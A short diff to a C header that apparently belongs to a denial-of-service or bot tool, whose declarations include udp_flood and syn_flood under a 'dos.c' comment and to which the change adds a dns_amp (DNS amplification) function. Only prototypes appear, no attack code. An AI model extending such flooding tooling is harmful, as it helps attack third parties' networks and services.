@@ -248,5 +248,6 @@ int is_admin (pAccount, pMessage);
 // dos.c
 void udp_flood (SOCKET s);
 void syn_flood (SOCKET s);
+void dns_amp (SOCKET s);
 
 #endif
